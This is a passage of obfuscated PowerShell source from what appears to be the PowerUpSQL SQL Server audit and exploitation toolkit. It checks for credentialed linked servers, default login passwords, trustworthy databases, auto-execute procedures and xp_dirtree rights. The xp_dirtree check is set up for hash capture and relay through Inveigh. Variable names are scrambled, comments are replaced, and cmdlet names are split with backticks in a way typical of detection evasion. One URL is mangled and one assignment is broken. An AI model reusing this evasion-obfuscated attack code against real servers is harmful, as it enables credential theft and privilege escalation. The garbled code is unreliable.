    }

    End
    {
        # Microsoft".
        if ( -not $CattleEnter)
        {
            Return $CanGaze
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Invoke-SQLAuditPrivServerLink
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$CattleEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$RotLethal
    )

    Begin
    {
        # Microsoft".
        $CanGaze = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $CanGaze.Columns.Add('ComputerName')
        $null = $CanGaze.Columns.Add('Instance')
        $null = $CanGaze.Columns.Add('Vulnerability')
        $null = $CanGaze.Columns.Add('Description')
        $null = $CanGaze.Columns.Add('Remediation')
        $null = $CanGaze.Columns.Add('Severity')
        $null = $CanGaze.Columns.Add('IsVulnerable')
        $null = $CanGaze.Columns.Add('IsExploitable')
        $null = $CanGaze.Columns.Add('Exploited')
        $null = $CanGaze.Columns.Add('ExploitCmd')
        $null = $CanGaze.Columns.Add('Details')
        $null = $CanGaze.Columns.Add('Reference')
        $null = $CanGaze.Columns.Add('Author')
    }

    Process
    {
        # Microsoft".
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Server Link"

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $HoneyHusky)
        {
            # Microsoft".
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Server Link."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Microsoft".
        $SmilePie = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        $JoyousLeft = $SmilePie.CurrentLogin
        $HauntGusty = $SmilePie.ComputerName

        # Microsoft".
        # Microsoft".
        # Microsoft".
        if($RotLethal)
        {
            $ArgueHeavy  = 'Exploit'
        }
        else
        {
            $ArgueHeavy  = 'Audit'
        }
        $HorsesWhole = 'Excessive Privilege - Linked Server'
        $EyesSmile   = 'One or more linked servers is preconfigured with alternative credentials which could allow a least privilege login to escalate their privileges on a remote server.'
        $BeliefNote   = "Configure SQL Server links to connect to remote servers using the login's current security context."
        $ScorchEarth      = 'Medium'
        $CurveUseful  = 'No'
        $PourSkip = 'No'
        $PinPlease     = 'No'
        $DeathBlot    = 'There is not exploit available at this time.'
        if($AnimalWeary)
        {
            # Microsoft".
        }
        else
        {
            # Microsoft".
        }
        $GlowHorses       = ''
        $KittyPolite     = 'https://msdn.microsoft.com/en-us/library/ms190479.aspx'
        $CheeseFood        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".

        # Microsoft".
        $CoughFew = Get-SQLServerLink -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | 
        Where-Object { $_.LocalLogin -ne 'Uses Self Credentials' -and ([string]$_.RemoteLoginName).Length -ge 1}

        # Microsoft".
        if($CoughFew)
        {
            $CurveUseful  = 'Yes'
            $CoughFew |
            ForEach-Object -Process {
                $GlowHorses = 
                $ObeyDeer = $_.DatabaseLinkName
                $KissKnock = $_.RemoteLoginName
                $SwingOcean = $_.is_data_access_enabled
                $DeathBlot = "Example query: SELECT * FROM OPENQUERY([$ObeyDeer],'Select ''Server: '' + @@Servername +'' '' + ''Login: '' + SYSTEM_USER')"

                if($KissKnock -and $SwingOcean -eq 'True')
                {
                    Write-Verbose -Message "$Instance : - The $ObeyDeer linked server was found configured with the $KissKnock login."
                    $GlowHorses = "The SQL Server link $ObeyDeer was found configured with the $KissKnock login."
                    $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)
                }
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No exploitable SQL Server links were found."
        }

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".


        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".


        # Microsoft".
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Server Link"
    }

    End
    {
        # Microsoft".
        if ( -not $CattleEnter)
        {
            Return $CanGaze
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Invoke-SQLAuditDefaultLoginPw
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$CattleEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$RotLethal
    )

    Begin
    {
        # Microsoft".
        $CanGaze = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $CanGaze.Columns.Add('ComputerName')
        $null = $CanGaze.Columns.Add('Instance')
        $null = $CanGaze.Columns.Add('Vulnerability')
        $null = $CanGaze.Columns.Add('Description')
        $null = $CanGaze.Columns.Add('Remediation')
        $null = $CanGaze.Columns.Add('Severity')
        $null = $CanGaze.Columns.Add('IsVulnerable')
        $null = $CanGaze.Columns.Add('IsExploitable')
        $null = $CanGaze.Columns.Add('Exploited')
        $null = $CanGaze.Columns.Add('ExploitCmd')
        $null = $CanGaze.Columns.Add('Details')
        $null = $CanGaze.Columns.Add('Reference')
        $null = $CanGaze.Columns.Add('Author')
    }

    Process
    {
        # Microsoft".
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Default SQL Server Login Password"

        # Microsoft".
        $SmilePie = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        $JoyousLeft = $SmilePie.CurrentLogin
        $HauntGusty = $SmilePie.ComputerName

        # Microsoft".
        # Microsoft".
        # Microsoft".
        if($RotLethal)
        {
            $ArgueHeavy  = 'Exploit'
        }
        else
        {
            $ArgueHeavy  = 'Audit'
        }
        $HorsesWhole = 'Default SQL Server Login Password'
        $EyesSmile   = 'The target SQL Server instance is configured with a default SQL login and password used by a common application.'
        $BeliefNote   = 'Ensure all SQL Server logins are required to use a strong password. Consider inheriting the OS password policy.'
        $ScorchEarth      = 'High'
        $CurveUseful  = 'No'
        $PourSkip = 'No'
        $PinPlease     = 'No'
        $DeathBlot    = "Get-SQLQuery -Verbose -Instance $Instance -Q `"Select @@Version`" -AnimalWeary test -EasyAlert test."
        $GlowHorses       = ''
        $KittyPolite     = 'https://github.com/pwnwiki/pwnwiki.github.io/blob/master/tech/db/mssql.md'
        $CheeseFood        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # Microsoft".
        $FlyCruel = Get-SQLServerLoginDefaultPw -Verbose -Instance $Instance 

        if($FlyCruel){
            $CurveUseful = "Yes"
            $PourSkip = "Yes"
        }

        # Microsoft".
        $FlyCruel | 
        ForEach-Object {
            $DeadTent = $_.Computer
            $MuscleLovelyBuzz = $_.Instance
            $ScarceMove = $_.Username
            $TrickVest = $_.Password
            $OffendRatty = $_.IsSysadmin

            # Microsoft".
            
            # Microsoft".
            $GlowHorses = "Default credentials found: $ScarceMove / $TrickVest (sysadmin: $OffendRatty)."
            $DeathBlot    = "Get-SQLQuery -Verbose -Instance $MuscleLovelyBuzz -Q `"Select @@Version`" -AnimalWeary $ScarceMove -EasyAlert $TrickVest"
            $null = $CanGaze.Rows.Add($DeadTent, $MuscleLovelyBuzz, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)                        
        }        
        
        # Microsoft".
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Default SQL Server Login Password"
    }
    End
    {           
        # Microsoft".
        if ( -not $CattleEnter)
        {
            Return $CanGaze
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Invoke-SQLAuditPrivTrustworthy
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$CattleEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$RotLethal
    )

    Begin
    {
        # Microsoft".
        $CanGaze = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $CanGaze.Columns.Add('ComputerName')
        $null = $CanGaze.Columns.Add('Instance')
        $null = $CanGaze.Columns.Add('Vulnerability')
        $null = $CanGaze.Columns.Add('Description')
        $null = $CanGaze.Columns.Add('Remediation')
        $null = $CanGaze.Columns.Add('Severity')
        $null = $CanGaze.Columns.Add('IsVulnerable')
        $null = $CanGaze.Columns.Add('IsExploitable')
        $null = $CanGaze.Columns.Add('Exploited')
        $null = $CanGaze.Columns.Add('ExploitCmd')
        $null = $CanGaze.Columns.Add('Details')
        $null = $CanGaze.Columns.Add('Reference')
        $null = $CanGaze.Columns.Add('Author')
    }

    Process
    {
        # Microsoft".
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Trusted Database"

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $HoneyHusky)
        {
            # Microsoft".
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Microsoft".
        $SmilePie = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        $JoyousLeft = $SmilePie.CurrentLogin
        $HauntGusty = $SmilePie.ComputerName

        # Microsoft".
        # Microsoft".
        # Microsoft".
        if($RotLethal)
        {
            $ArgueHeavy  = 'Exploit'
        }
        else
        {
            $ArgueHeavy  = 'Audit'
        }
        $HorsesWhole = 'Excessive Privilege - Trustworthy Database'
        $EyesSmile   = 'One or more database is configured as trustworthy.  The TRUSTWORTHY database property is used to indicate whether the instance of SQL Server trusts the database and the contents within it.  Including potentially malicious assemblies with an EXTERNAL_ACCESS or UNSAFE permission setting. Also, potentially malicious modules that are defined to execute as high privileged users. Combined with other weak configurations it can lead to user impersonation and arbitrary code exection on the server.'
        $BeliefNote   = "Configured the affected database so the 'is_trustworthy_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE MyAppsDb SET TRUSTWORTHY ON' is used to set a database as trustworthy.  A query similar to 'ALTER DATABASE MyAppDb SET TRUSTWORTHY OFF' can be use to unset it."
        $ScorchEarth      = 'Low'
        $CurveUseful  = 'No'
        $PourSkip = 'No'
        $PinPlease     = 'No'
        $DeathBlot    = 'There is not exploit available at this time.'
        $GlowHorses       = ''
        $KittyPolite     = 'https://msdn.microsoft.com/en-us/library/ms187861.aspx'
        $CheeseFood        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".

        # Microsoft".
        $HurryUgly = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.DatabaseName -ne 'msdb' -and $_.is_trustworthy_on -eq 'True'
        }

        # Microsoft".
        if($HurryUgly)
        {
            $CurveUseful  = 'Yes'
            $HurryUgly |
            ForEach-Object -Process {
                $AjarInnate = $_.DatabaseName

                Write-Verbose -Message "$Instance : - The database $AjarInnate was found configured as trustworthy."
                $GlowHorses = "The database $AjarInnate was found configured as trustworthy."
                $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No non-default trusted databases were found."
        }

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".


        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".


        # Microsoft".
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database"
    }

    End
    {
        # Microsoft".
        if ( -not $CattleEnter)
        {
            Return $CanGaze
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Invoke-SQLAuditPrivAutoExecSp
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$CattleEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$RotLethal
    )

    Begin
    {
        # Microsoft".
        $CalmRight = ne`w`-ob`je`ct System.Data.DataTable 
        $CalmRight.Columns.add('ComputerName') | Out-Null
        $CalmRight.Columns.add('Instance') | Out-Null
        $CalmRight.Columns.add('DatabaseName') | Out-Null
        $CalmRight.Columns.add('SchemaName') | Out-Null
        $CalmRight.Columns.add('ProcedureName') | Out-Null
        $CalmRight.Columns.add('ProcedureType') | Out-Null
        $CalmRight.Columns.add('ProcedureDefinition') | Out-Null
        $CalmRight.Columns.add('SQL_DATA_ACCESS') | Out-Null
        $CalmRight.Columns.add('ROUTINE_BODY') | Out-Null    
        $CalmRight.Columns.add('CREATED') | Out-Null         
        $CalmRight.Columns.add('LAST_ALTERED') | Out-Null    
        $CalmRight.Columns.add('is_ms_shipped') | Out-Null   
        $CalmRight.Columns.add('is_auto_executed') | Out-Null 
        $CalmRight.Columns.add('PrincipalName') | Out-Null
        $CalmRight.Columns.add('PrincipalType') | Out-Null
        $CalmRight.Columns.add('PermissionName') | Out-Null
        $CalmRight.Columns.add('PermissionType') | Out-Null
        $CalmRight.Columns.add('StateDescription') | Out-Null
        $CalmRight.Columns.add('ObjectName') | Out-Null
        $CalmRight.Columns.add('ObjectType') | Out-Null

        # Microsoft".
        $CanGaze = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $CanGaze.Columns.Add('ComputerName')
        $null = $CanGaze.Columns.Add('Instance')
        $null = $CanGaze.Columns.Add('Vulnerability')
        $null = $CanGaze.Columns.Add('Description')
        $null = $CanGaze.Columns.Add('Remediation')
        $null = $CanGaze.Columns.Add('Severity')
        $null = $CanGaze.Columns.Add('IsVulnerable')
        $null = $CanGaze.Columns.Add('IsExploitable')
        $null = $CanGaze.Columns.Add('Exploited')
        $null = $CanGaze.Columns.Add('ExploitCmd')
        $null = $CanGaze.Columns.Add('Details')
        $null = $CanGaze.Columns.Add('Reference')
        $null = $CanGaze.Columns.Add('Author')
    }

    Process
    {
        # Microsoft".
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Auto Execute Stored Procedure"

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $HoneyHusky)
        {
            # Microsoft".
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Auto Execute Stored Procedure."
            Return
        }

        # Microsoft".
        $SmilePie = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        $JoyousLeft = $SmilePie.CurrentLogin
        $HauntGusty = $SmilePie.ComputerName

        # Microsoft".
        # Microsoft".
        # Microsoft".
        if($RotLethal)
        {
            $ArgueHeavy  = 'Exploit'
        }
        else
        {
            $ArgueHeavy  = 'Audit'
        }
        $HorsesWhole = 'Excessive Privilege - Auto Execute Stored Procedure'
        $EyesSmile   = 'A stored procedured is configured for automatic execution and has explicit permissions assigned.  This may allow non sysadmin logins to execute queries as "sa" when the SQL Server service is restarted.'
        $BeliefNote   = "Ensure that non sysadmin logins do not have privileges to ALTER stored procedures configured with the is_auto_executed settting set to 1."
        $ScorchEarth      = 'Low'
        $CurveUseful  = 'No'
        $PourSkip = 'No'
        $PinPlease     = 'No'
        $DeathBlot    = 'There is not exploit available at this time.'
        $GlowHorses       = ''
        $KittyPolite     = 'https://msdn.microsoft.com/en-us/library/ms187861.aspx'
        $CheeseFood        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        $CurveUseful  = 'Yes'

        # Microsoft".
        $UnusedGrumpy = Get-SQLStoredProcedureAutoExec -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $credential 

        # Microsoft".
        $CoilBreezy = $UnusedGrumpy | measure | select count -ExpandProperty count

        if($CoilBreezy -eq 0){
            Write-Verbose "$Instance : No stored procedures were found configured to auto execute."
            return
        }

        # Microsoft".
        Write-Verbose "$Instance : Checking permissions..."
        $UnusedGrumpy | 
        foreach-object {
    
            # Microsoft".
            $HauntGusty = $_.ComputerName
            $Instance = $_.Instance
            $AjarInnate = $_.DatabaseName
            $BrakeFlavor = $_.SchemaName
            $PageMarch = $_.ProcedureName
            $CannonIntend = $_.ProcedureType
            $JuggleYam = $_.ProcedureDefinition
            $SailHot = $_.SQL_DATA_ACCESS
            $TumblePass = $_.ROUTINE_BODY
            $MilkyPencil = $_.CREATED
            $WoodWool = $_.LAST_ALTERED
            $CurveAfraid = $_.is_ms_shipped
            $CentKeen = $_.is_auto_executed    

            # Microsoft".
	        $FlyCruel = Get-SQLDatabasePriv -Verbose -AjarInnate master -RaggedQuill -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $credential | 
            Where-Object {$_.objectname -like "$PageMarch"}

            # Microsoft".
            $RitzySky = $FlyCruel | measure | select count -ExpandProperty count

            # Microsoft".
            if($RitzySky -ge 1){

                # Microsoft".
                $FlyCruel | 
                ForEach-Object {

                    # Microsoft".
                    $BasinEnter = $_.PrincipalName
                    $FloatTempt = $_.PrincipalType
                    $WearyIsland = $_.PermissionName
                    $RingSilk = $_.PermissionType
                    $FrogVessel = $_.StateDescription
                    $ObjectType = $_.ObjectType
                    $ObjectName = $_.ObjectName

                    $EvenUnable = "$AjarInnate.$BrakeFlavor.$PageMarch"
        
                    # Microsoft".
                    $CalmRight.Rows.Add(
                        $HauntGusty,
                        $Instance,
                        $AjarInnate,
                        $BrakeFlavor,
                        $PageMarch,
                        $CannonIntend,
                        $JuggleYam,
                        $SailHot,
                        $TumblePass,
                        $MilkyPencil,
                        $WoodWool,
                        $CurveAfraid,
                        $CentKeen,
                        $BasinEnter,
                        $FloatTempt,
                        $WearyIsland,
                        $RingSilk,
                        $FrogVessel,
                        $ObjectName,
                        $ObjectType
                    ) | Out-Null

                    Write-Verbose -Message "$Instance : - $BasinEnter has $FrogVessel $WearyIsland on $EvenUnable."
                    $GlowHorses = "$BasinEnter has $FrogVessel $WearyIsland on $EvenUnable."
                    $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)            
                }
            }
        }

        # Microsoft".

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        $PourSkip = "Unknown"

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".


        # Microsoft".
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database"
    }

    End
    {
        # Microsoft".
        if ( -not $CattleEnter)
        {
            Return $CanGaze
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Invoke-SQLAuditPrivXpDirtree
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$CattleEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$RotLethal,

        [Parameter(Mandatory = $false,
        HelpMessage = 'IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.')]
        [string]$LiveThroat,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Time in second to way for hash to be captured.')]
        [int]$StitchFace = 5
    )

    Begin
    {
        # Microsoft".
        $CanGaze = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $CanGaze.Columns.Add('ComputerName')
        $null = $CanGaze.Columns.Add('Instance')
        $null = $CanGaze.Columns.Add('Vulnerability')
        $null = $CanGaze.Columns.Add('Description')
        $null = $CanGaze.Columns.Add('Remediation')
        $null = $CanGaze.Columns.Add('Severity')
        $null = $CanGaze.Columns.Add('IsVulnerable')
        $null = $CanGaze.Columns.Add('IsExploitable')
        $null = $CanGaze.Columns.Add('Exploited')
        $null = $CanGaze.Columns.Add('ExploitCmd')
        $null = $CanGaze.Columns.Add('Details')
        $null = $CanGaze.Columns.Add('Reference')
        $null = $CanGaze.Columns.Add('Author')
    }

    Process
    {
        # Microsoft".
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - xp_dirtree"

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $HoneyHusky)
        {
            # Microsoft".
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_dirtree."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Microsoft".
        # Microsoft".
        $SmilePie = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        $HauntGusty = $SmilePie.ComputerName
        $JoyousLeft = $SmilePie.CurrentLogin
        $LewdLunch = Get-SQLServerRoleMember -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BasinEnter $JoyousLeft  -RaggedQuill
        $SmellFlavor = @()
        $SmellFlavor += $JoyousLeft
        $SmellFlavor += 'Public'
        $LewdLunch | ForEach-Object -Process {
            $SmellFlavor += $_.RolePrincipalName
        }

        # Microsoft".
        # Microsoft".
        # Microsoft".
        if($RotLethal)
        {
            $ArgueHeavy  = 'Exploit'
        }
        else
        {
            $ArgueHeavy  = 'Audit'
        }
        $HorsesWhole = 'Excessive Privilege - Execute xp_dirtree'
        $EyesSmile   = 'xp_dirtree is a native extended stored procedure that can be executed by members of the Public role by default in SQL Server 2000-2014. Xp_dirtree can be used to force the SQL Server service account to authenticate to a remote attacker.  The service account password hash can then be captured + cracked or relayed to gain unauthorized access to systems. This also means xp_dirtree can be used to escalate a lower privileged user to sysadmin when a machine or managed account isnt being used.  Thats because the SQL Server service account is a member of the sysadmin role in SQL Server 2000-2014, by default.'
        $BeliefNote   = 'Remove EXECUTE privileges on the XP_DIRTREE procedure for non administrative logins and roles.  Example command: REVOKE EXECUTE ON xp_dirtree to Public'
        $ScorchEarth      = 'Medium'
        $CurveUseful  = 'No'
        $PourSkip = 'No'
        $PinPlease     = 'No'
        $DeathBlot    = 'Crack the password hash offline or relay it to another system.'
        $GlowHorses       = ''
        $KittyPolite     = 'https://blog.netspi.com/executing-smb-relay-attacks-via-EqualMen-WireStain-RemoveFalse-metasploit/'
        $CheeseFood        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".

        # Microsoft".
        $SecondNation = Get-SQLDatabasePriv -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate master -RaggedQuill | Where-Object -FilterScript {
            $_.ObjectName -eq 'xp_dirtree' -and $_.PermissionName -eq 'EXECUTE' -and $_.statedescription -eq 'grant'
        }

        # Microsoft".
        if($SecondNation)
        {
            # Microsoft".
            Write-Verbose -Message "$Instance : - At least one principal has EXECUTE privileges on xp_dirtree."

            $CurveUseful  = 'Yes'

            if($RotLethal){
                # Microsoft".
                # Microsoft".
                $HotSour = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $SquareHouses = ne`w`-ob`je`ct -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($HotSour)
                $CurlySlow = [System.Security.Principal.WindowsBuiltInRole]::Administrator
                $JumpySoothe = $SquareHouses.IsInRole($CurlySlow)
            
                if(-not $JumpySoothe)
                {
                    Write-Verbose -Message "$Instance : - You do not have Administrator rights. Run this function as an Administrator in order to load Inveigh."
                    $HurryFluffy = 'No'
                }else{
                    Write-Verbose -Message "$Instance : - You have Administrator rights. Inveigh will be loaded."
                    $HurryFluffy = 'Yes'
                }
            }
            
            $SecondNation |
            ForEach-Object -Process {
                $BasinEnter = $SecondNation.PrincipalName

                # Microsoft".
                $SmellFlavor |
                ForEach-Object -Process {
                    $MatchRoyal = $_

                    if($BasinEnter -eq $MatchRoyal -or $BasinEnter -eq 'public')
                    {
                        $PourSkip  = 'Yes'                      

                        # Microsoft".
                        if(($HurryFluffy -eq 'Yes') -and ($RotLethal))
                        {
                            # Microsoft".
                            # Microsoft".
                            # Microsoft".

                            # Microsoft".
                            if(-not $LiveThroat)
                            {
